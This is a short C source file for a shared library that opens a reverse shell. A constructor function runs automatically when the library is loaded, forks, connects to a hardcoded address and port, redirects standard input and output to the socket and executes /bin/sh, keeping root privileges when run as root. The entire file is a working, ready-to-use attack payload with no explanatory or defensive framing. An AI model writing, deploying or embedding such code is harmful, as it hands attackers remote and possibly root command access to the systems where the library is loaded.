#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <string.h>

char ip_addr[16] = "127.0.0.1";
char port[6] = "3343";
char exe_path[255] = "/bin/sh";
char exe_arg0[50] = "sh";

void spawn() {
    int socket_fd;
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip_addr);
    addr.sin_port = htons(atoi(port));

    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr));

    dup2(socket_fd, 0); // STDIN
    dup2(socket_fd, 1); // STDOUT
    dup2(socket_fd, 2); // STDERR

    if (geteuid() == 0){
        setresuid(0, 0, 0);
        setresgid(0, 0, 0);
    }
    execl(exe_path, exe_arg0, NULL, NULL, NULL);
}

static void reverse_shell(void) __attribute__((constructor));
static void reverse_shell(void)
{
    pid_t pid = fork();
    if (pid == 0){
        spawn();
    exit(0);
    }
    return;
}
